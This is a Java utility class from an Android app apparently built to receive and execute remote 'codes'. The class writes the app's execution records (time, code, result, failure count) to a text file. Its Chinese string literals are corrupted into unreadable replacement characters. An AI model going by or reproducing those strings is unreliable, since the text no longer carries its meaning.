package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.db.InnerDbOpera;

public class CodesToTxtUtil {

	private static CodesToTxtUtil mInstence;

	private CodesToTxtUtil() {

	}

	public static CodesToTxtUtil getInstence() {
		if (mInstence == null) {
			mInstence = new CodesToTxtUtil();
		}
		return mInstence;
	}

	public synchronized void saveAllCodesToTextFile() {

		InnerDbOpera opera = InnerDbOpera.getInstence();

		ArrayList<Code> codes = opera.getAllCode();

		if (MainApplication.FILE_CODE_TEXT.exists()) {
			MainApplication.FILE_CODE_TEXT.delete();
		}
		if (codes != null && codes.size() > 0) {
			String dateTemp = "";
			StringBuffer sb = new StringBuffer();
			sb.append("��ʾ������������ִ������������ο���\r\n[��ʱ��������ʾ�����ʹʧ�ܣ�Ҳ����ʱ����ִ�У��������·���ִ��ʧ�ܵ����]");
			for (Code code : codes) {

				String date = TimeUtil.longToDateString(code.getDate());

				if (!dateTemp.equals(date)) {
					dateTemp = String.valueOf(date);
					sb.append("\r\n\r\n�� ").append(date).append("��\r\n\r\n");
				}
				sb.append("\r\n\r\n").append(TimeUtil.longToTime(code.getDate())).append("   ��").append(code.getCode()).append("��\r\n").append(code.getMark());
				switch (code.getResult()) {
				case Code.RESULT_OK:
					sb.append("\r\nִ�гɹ�");
					if (code.getFailedTimes() > 0) {
						sb.append("   [����ִ��ʧ�ܹ��Ĵ�����").append(code.getFailedTimes()).append("]");
					}
					break;
				case Code.RESULT_FAILED:
					if (code.getFailedTimes() > 0) {
						sb.append("\r\nִ��ʧ��").append("   ʧ�ܴ�����").append(code.getFailedTimes());
					} else if (code.getRedoNeed() == Code.REDO_NEED) {
						sb.append("\r\n����ִ��").append("   [���ܵ�ǰִ�е����Ǵ�����]");
					} else {
						sb.append("\r\nִ��ʧ��").append("   [�����������ٴ�ִ��]");
					}
					break;
				case Code.RESULT_CODE_REPEAT:
					sb.append("\r\n�����ظ�������ִ��");
					break;

				default:
					break;
				}
			}
			FileUtil.writeFile(sb.toString(), MainApplication.FILE_CODE_TEXT, true);
		} else {
			FileUtil.writeFile("��������ִ�м�¼��", MainApplication.FILE_CODE_TEXT, true);
		}
	}
}
